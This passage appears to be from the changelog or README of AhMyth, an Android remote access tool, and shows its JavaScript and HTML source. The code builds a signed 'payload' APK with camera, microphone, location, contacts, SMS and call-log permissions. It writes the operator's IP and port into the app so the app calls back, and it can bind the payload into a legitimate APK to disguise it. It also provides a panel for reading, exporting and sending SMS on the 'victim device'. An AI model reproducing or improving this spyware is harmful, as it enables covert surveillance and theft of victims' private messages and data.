            $appCtrl.$apply();
        }
    }
```

- GenerateApk function
```js
    $appCtrl.GenerateApk = async (apkFolder) => {
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            // default permissions for the payload
            const permissions = CONSTANTS.permissions;

            // Create an array to store the selected permissions
            var selectedPermissions = [];

            // Check each checkbox and add the corresponding permission to the selectedPermissions array
            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            // If all checkboxes are unchecked, set selectedPermissions to an empty array
            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[★] Reading the Payload Manifest File...');
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                try {
                    delayedLog('[★] Parsing the Payload Manifest Data...');
                    const parsedData = await new Promise((resolve, reject) => {
                        xml2js.parseString(data, (parseError, parsedData) => {
                            if (parseError) {
                                reject(parseError);
                            } else {
                                // Modify the manifest data as needed
                                parsedData.manifest['uses-permission'] = [];
                                parsedData.manifest['uses-feature'] = [];

                                selectedPermissions.forEach(permission => {
                                    if (permission === 'android.hardware.camera') {
                                        parsedData.manifest['uses-feature'].push({
                                            $: {
                                                'android:name': 'android.hardware.camera'
                                            }
                                        });
                                    }

                                    if (permission === 'android.hardware.camera.autofocus') {
                                        parsedData.manifest['uses-feature'].push({
                                            $: {
                                                'android:name': 'android.hardware.camera.autofocus'
                                            }
                                        });
                                    }

                                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                                        parsedData.manifest['uses-permission'].push({
                                            $: {
                                                'android:name': permission
                                            }
                                        });
                                    }
                                });

                                resolve(parsedData);
                            }
                        });
                    });

                    // Convert the modified parsed data back to XML
                    const builder = new xml2js.Builder();
                    const updatedData = builder.buildObject(parsedData);
                    await fs.promises.writeFile(
                        dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'),
                        updatedData,
                        'utf8'
                    );
                } catch (parseError) {
                    delayedLog('[x] Error occurred while parsing the Payload Manifest:', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Parsing');
                    delayedLog('[¡] Error written to "Parsing.log" on', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }
            } catch (readError) {
                // Handle errors related to reading the file
                delayedLog('[x] Error occurred while reading the Payload Manifest File:', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading');
                delayedLog('[¡] Error written to "Reading.log" on', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

        }

        try {
            delayedLog('[★] Emptying the Apktool Framework Directory...');
            exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        if ($appCtrl.bindApk.enable) {

            // Build and Sign the Bound AhMyth Payload
            var originApkName = dir.basename(apkFolder) + ".apk";
            delayedLog('[★] Building ' + originApkName + '...');
            var createBoundApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, originApkName) + '" --use-aapt2 "' + '"';
            exec(createBoundApk,
                (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Building');
                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Signing ' + originApkName + '...');
                    var signBoundApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, originApkName) + '"';
                    exec(signBoundApk, (error, stdout, stderr) => {
                        if (error !== null) {
                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Signing');
                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Remove the decompiled APK folder
                        delayedLog('[★] Cleaning up...')
                        fs.rmdir(apkFolder, {
                            recursive: true
                        }, (err) => {
                            if (err) throw err;
                        });

                        fs.unlink(dir.join(outputPath, originApkName),
                            (err) => {
                                if (err) throw err;

                                const apkNameBoundSigned = CONSTANTS.getApkNameBoundSigned(apkFolder);
                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + dir.join(outputPath, apkNameBoundSigned), CONSTANTS.logStatus.INFO);
                                delayedLog();

                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                                    if (err) throw err;
                                });
                            });
                    });
                });
        } else {
            // Build and Sign the Standalone AhMyth Payload
            var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
            delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
            exec(createApk,
                (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Building');
                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
                    var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                    exec(signApk, (error, stdout, stderr) => {
                        if (error !== null) {
                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Signing');
                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        fs.unlink(dir.join(outputPath, CONSTANTS.apkName),
                            (err) => {
                                if (err) throw err;

                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
                                delayedLog();

                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                                    if (err) throw err;
                                });
                            });
                    });
                });
        }
    };
```
</details>
<br>

<details>
    <summary>Updated SMS Feature (Server Side)</summary>
<br>

- SMSManager.html
```html
<div class="ui top attached tabular menu">
    <a class="item active" data-tab="sendSms">Send SMS</a>
    <a class="item" data-tab="smsLists">SMS Lists</a>
</div>

<!-- "Send SMS" Tab for sending text messages from the Victim Device -->
<div class="ui bottom attached tab segment active h90 center aligned" data-tab="sendSms">
    <br>
    <div class="ui labeled input">
        <div class="ui label">
            TO://
        </div>
        <input type="text" ng-model="phoneNo" placeholder="Phone Number">
    </div>
    <br>
    <label>Message :</label>
    <br>
    <textarea class="w100 h40" ng-model="msg" placeholder="Message to send.."></textarea>
    <br>
    <br>
    <button class="ui labeled icon red button" ng-click="SendSMS(phoneNo,msg)"> <i class="send outline icon"></i>SEND</button>
</div>

<!-- "SMS Lists" Tab containing nested Inbox and Outbox Tabs -->
<div class="ui bottom attached tab segment h90" data-tab="smsLists">
    <div class="ui top attached tabular menu">
        <a class="item active" data-tab="inboxSMSList" ng-click="getInboxSMSList()">Inbox List</a>
        <a class="item" data-tab="sentSMSList" ng-click="getSentSMSList()">Outbox List</a>
    </div>

    <!-- "Inbox List" Tab for viewing a list of Text Messages the Victim Device has received -->
    <div class="ui bottom attached tab {{load}} segment h90" data-tab="inboxSMSList" style="overflow: scroll; height: 360px;" id="inboxParent">
        <table class="ui very compact striped table">
            <thead>
                <tr>
                    <th>
                        <div class="ui label">
                            <i class="mail icon"></i> <span ng-bind="smsSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="SaveInboxSMS()">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseLimit()" infinite-scroll-container='"#inboxParent"'>
                <tr ng-repeat="sms in receivedList | limitTo:inboxBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- "Outbox List" Tab for viewing a list of Text Messages sent from the Victim Device -->
    <div class="ui bottom attached tab {{load}} segment h90" data-tab="sentSMSList" style="overflow: scroll; height: 360px;" id="sentParent">
        <table class="ui very compact striped table">
            <thead>
                <tr>
                    <th>
                        <div class="ui label">
                            <i class="mail icon"></i> <span ng-bind="smsSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="SaveSentSMS()">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseLimit()" infinite-scroll-container='"#sentParent"'>
                <tr ng-repeat="sms in sentList | limitTo:sentBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
```
- LabCtrl.js
```javascript
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.inboxSMSList = [];
    $SMSCtrl.sentSMSList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });


    // send request to victim to bring all sms
    $SMSCtrl.getInboxSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.inboxBarLimit = 50;
        $rootScope.Log('Get SMS list..');
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.getSentSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.sentBarLimit = 50;
        $rootScope.Log('Get SMS list..');
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        $rootScope.Log('Sending SMS..');
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save sms list to csv file
    $SMSCtrl.SaveInboxSMS = () => {

        if ($SMSCtrl.receivedList.length == 0)
            return;


        var inboxCsvRows = [];
        for (var i = 0; i < $SMSCtrl.receivedList.length; i++) {
            inboxCsvRows.push($SMSCtrl.receivedList[i].phoneNo + "," + $SMSCtrl.receivedList[i].msg);
        }

        var csvStr = inboxCsvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("Saving SMS List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Inbox SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    // save sms list to csv file
    $SMSCtrl.SaveSentSMS = () => {

        if ($SMSCtrl.sentList.length == 0)
            return;


        var sentCsvRows = [];
        for (var i = 0; i < $SMSCtrl.sentList.length; i++) {
            sentCsvRows.push($SMSCtrl.sentList[i].phoneNo + "," + $SMSCtrl.sentList[i].msg);
        }

        var csvStr = sentCsvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("Saving SMS List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Sent/Outbox SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }


    //listening for victim response
    socket.on(sms, (data) => {
        if (data.inboxSMSList) {
            $SMSCtrl.load = '';
            $rootScope.Log('Inbox SMS list arrived', CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.receivedList = data.inboxSMSList;
            $SMSCtrl.smsSize = data.inboxSMSList.length;
            $SMSCtrl.$apply();
        } else if (data.sentSMSList) {
            $SMSCtrl.load = '';
            $rootScope.Log('Sent SMS list arrived', CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.sentList = data.sentSMSList;
            $SMSCtrl.smsSize = data.sentSMSList.length;
            $SMSCtrl.$apply();
        } else {
            if (data == true)
                $rootScope.Log('SMS sent', CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
        }
    })
});
```

</details>
<br>

<details>
    <summary>Updated 'checkJavaVersion' function for Java 21 support + OS Specific path seperation.</summary>
    <br>

## This adds support for any version of java 8 all the way up to java 21
```js
    $appCtrl.Build = (ip, port) => {
        // Check Java version before proceeding
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                $appCtrl.Log('[x] ' + error.message, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] Please Install any version of Java 8 upto 21 to Use This Feature.', CONSTANTS.logStatus.INFO);
                return;
            } else if (parseFloat(javaVersion) < 1.8 || parseFloat(javaVersion) >= 22) {
                // excludes any java version less than 8 or greater than or equal to 22
                $appCtrl.Log(`[x] Unsupported Java Version Installed, Detected Version "${javaVersion}"`, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] AhMyth Requires any Version of Java 8 through 21 to use This Feature.', CONSTANTS.logStatus.INFO);
                return;
            } else {
                if (!ip) {
                    $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
                    return;
                }
                if (!port) {
                    port = CONSTANTS.defaultPort;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);
                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }
                            $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                        });
                    });
                } else {
                    var filePath = $appCtrl.filePath;
                    if (!filePath) {
                        $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
                        return;
                    }
                    if (!filePath.includes(".apk")) {
                        $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);

                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // generate a solid ahmyth apk
                            var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                            var apkName = dir.basename(apkFolder) + ".apk";
                            delayedLog('[★] ' + 'Decompiling ' + '"' + apkName + '"' + "...");

                            var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';

                            exec(decompileApk, (error, stdout, stderr) => {
                                if (error !== null) {
                                    delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                                    writeErrorLog(error, 'Decompiling');
                                    delayedLog('[¡] Error Written to "Decompiling.log" on', CONSTANTS.logStatus.INFO);
                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                    return;
                                }

                                if ($appCtrl.bindApk.method == 'BOOT')
                                    $appCtrl.bindOnBoot(apkFolder);

                                else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                    $appCtrl.bindOnActivity(apkFolder);

                            });
                        });
                    });
                }
            }
        });
    };
});

// Function to check if Java version 11 is installed
function checkJavaVersion(callback) {
    exec('java -version',
        (error, stdout, stderr) => {
            if (error) {
                callback(new Error('Java is not installed or not accessible.'));
            } else {
                const versionOutput = stderr || stdout;
                const versionMatch = versionOutput.match(/version "([^"]+)"/);
                if (versionMatch) {
                    const versionString = versionMatch[1];
                    callback(null, versionString);
                } else {
                    callback(new Error('Java is not installed or not accessible.'));
                }
            }
        });
}
```
</details>